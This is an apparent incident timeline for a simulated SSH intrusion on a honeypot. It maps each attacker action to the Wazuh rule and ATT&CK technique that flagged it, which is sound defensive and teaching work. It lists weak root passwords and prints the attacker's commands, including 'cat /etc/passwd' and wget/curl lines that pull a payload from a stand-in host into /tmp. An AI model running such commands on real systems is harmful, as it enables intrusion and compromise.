# Incident Timeline, INC-2026-0819-001

Correlated event timeline for the intrusion against `web-prod-01` on 2026-08-19.
Every row maps a real Cowrie event to the Wazuh rule that fired on it. Times are
the **Cowrie event timestamps** (when the attacker acted), taken from
[`raw-logs/cowrie-incident-2026-08-19.json`](raw-logs/cowrie-incident-2026-08-19.json),
not the Wazuh ingest time (the manager processed the batch a few seconds later).
Where a base rule is escalated by a correlation rule, both IDs are shown as
`base -> escalated`.

| # | Time (UTC) | Source | Event | Rule | ATT&CK |
|--:|-----------|--------|-------|:----:|--------|
| 1 | 22:19:56.367 | 172.19.0.1 | New SSH connection (session `127877d05a3f`) | 100101 | T1021.004 |
| 2 | 22:19:56.405 | 172.19.0.1 | Failed login `root/admin` | 100102 | T1110 |
| 3 | 22:19:57.921 | 172.19.0.1 | Failed login `root/password` | 100102 | T1110 |
| 4 | 22:19:59.488 | 172.19.0.1 | Failed login `root/123456` | 100102 | T1110 |
| 5 | 22:20:00.999 | 172.19.0.1 | Failed login `root/12345` | 100102 | T1110 |
| 6 | 22:20:02.522 | 172.19.0.1 | Failed login `root/root` | 100102 | T1110 |
| 7 | 22:20:04.035 | 172.19.0.1 | Failed login `root/toor` | 100102 | T1110 |
| 8 | 22:20:05.546 | 172.19.0.1 | Failed login `root/qwerty` | 100102 | T1110 |
| 9 | 22:20:07.075 | 172.19.0.1 | Failed login `root/letmein` (**8th failure in the window**) | 100102 -> **100104** | T1110 |
| 10 | 22:20:08.587 | 172.19.0.1 | Failed login `root/changeme` | 100102 | T1110 |
| 11 | 22:20:10.109 | 172.19.0.1 | Failed login `root/000000` | 100102 | T1110 |
| 12 | 22:20:11.638 | 172.19.0.1 | **Successful login `root/hunter2`** (session `e027ba8e7f0c`) | 100103 -> **100105** | T1078, T1110 |
| 13 | 22:20:12.032 | 172.19.0.1 | New SSH connection (**12th connection in the window**, session `84b2d6cd4479`) | 100101 -> **100110** | T1046 |
| 14 | 22:20:12.040 | 172.19.0.1 | **Successful login `root/hunter2`** (interactive shell) | 100103 -> **100105** | T1078, T1110 |
| 15 | 22:20:13.052 | 172.19.0.1 | Command `whoami` | 100107 -> **100151** | T1033 |
| 16 | 22:20:14.252 | 172.19.0.1 | Command `id` | 100107 -> **100151** | T1033 |
| 17 | 22:20:15.451 | 172.19.0.1 | Command `uname -a` | 100107 -> **100151** | T1082 |
| 18 | 22:20:16.652 | 172.19.0.1 | Command `cat /etc/passwd` | 100107 -> **100151** | T1033 |
| 19 | 22:20:17.853 | 172.19.0.1 | Command `ps aux` | 100107 -> **100151** | T1082 |
| 20 | 22:20:19.054 | 172.19.0.1 | Command `ifconfig` | 100107 -> **100151** | T1082 |
| 21 | 22:20:20.256 | 172.19.0.1 | Command `wget http://203.0.113.10/x.sh -O /tmp/x.sh` | **100108** | T1105 |
| 22 | 22:20:21.458 | 172.19.0.1 | Command `curl http://203.0.113.10/payload -o /tmp/p` | **100108** | T1105 |
| 23 | 22:20:22.657 | 172.19.0.1 | Command `exit` | 100106 | T1059.004 |
| 24 | 22:20:23.658 | 172.19.0.1 | Session closed (session `84b2d6cd4479`) | n/a | n/a |

## Reading the timeline

- **Rows 1–11 (credential access).** Ten `root` password guesses in ~14 seconds,
  each in its own short-lived SSH session. The eighth failure (`root/letmein`)
  crossed rule 100104's threshold of 8 failures in 120 seconds, firing the
  brute-force alert at level 10.
- **Rows 12–14 (initial access).** The 11th password, `hunter2`, worked. Because
  the success came from a source already flagged by 100104, rule 100105 fired at
  level 12. The 12th connection in the window also tripped the rapid-connection
  rule 100110 (T1046). Two success events appear because the attack tooling
  validated the credential once, then reconnected to open the interactive shell
  (`84b2d6cd4479`) where all later activity happened.
- **Rows 15–20 (discovery).** Six host-enumeration commands. Each matched the
  recon rule 100107, and because the same source had already tripped 100104,
  every one escalated to rule 100151 at level 12, the second page of the incident.
- **Rows 21–22 (command and control).** Two attempts to pull a remote payload.
  Both matched rule 100108. No `cowrie.session.file_download` event followed, so
  rule 100109 did not fire: nothing was actually retrieved (the payload host is a
  reserved documentation address, see the impact section of the report).
